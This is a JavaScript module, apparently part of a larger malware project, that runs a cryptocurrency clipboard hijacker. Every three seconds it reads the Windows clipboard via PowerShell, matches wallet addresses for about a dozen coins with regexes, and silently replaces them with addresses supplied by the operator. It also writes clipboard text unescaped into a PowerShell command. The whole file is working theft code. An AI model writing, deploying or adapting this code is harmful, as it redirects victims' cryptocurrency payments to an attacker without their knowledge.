const program = require('../../utils/program/program.js');

const CHECK_INTERVAL = 3000;

module.exports = (cryptos) => {
  const regexs = {
    BTC: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/,
    BCH: /^((bitcoincash:)?(q|p)[a-z0-9]{41})$/,
    ETH: /^0x[a-fA-F0-9]{40}$/,
    XMR: /^4([0-9]|[A-B]).{93}$/,
    LTC: /^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/,
    XCH: /^xch1[a-zA-HJ-NP-Z0-9]{58}$/,
    XLM: /^G[0-9a-zA-Z]{55}$/,
    TRX: /^T[A-Za-z1-9]{33}$/,
    ADA: /addr1[a-z0-9]+/,
    XRP: /^r[0-9a-zA-Z]{24,34}$/,
    NEO: /^A[0-9a-zA-Z]{33}$/,
    DASH: /^X[1-9A-HJ-NP-Za-km-z]{33}$/,
    DOGE: /^(D|A|9)[a-km-zA-HJ-NP-Z1-9]{33}$/,
  };

  let previousClipboardContent = '';

  const CheckClipboard = async () => {
    try {
      const clipboardContent = await program.ExecPowerShell('Get-Clipboard');
      if (!clipboardContent || clipboardContent === previousClipboardContent) return;

      let updatedText = clipboardContent;
      let replaced = false;

      for (const [crypto, regex] of Object.entries(regexs)) {
        const address = cryptos[crypto];
        const lines = updatedText.split('\n');

        for (const line of lines) {
          if (line === address) continue;
          if (regex.test(line)) {
            replaced = true;
            updatedText = updatedText.replace(line, address);
          }
        }

        if (replaced) {
          await program.ExecPowerShell(`Set-Clipboard "${updatedText}"`);
          previousClipboardContent = updatedText;
          break;
        }
      }
    } catch (error) {
      console.log(error);
    }
  };

  setInterval(CheckClipboard, CHECK_INTERVAL);
};
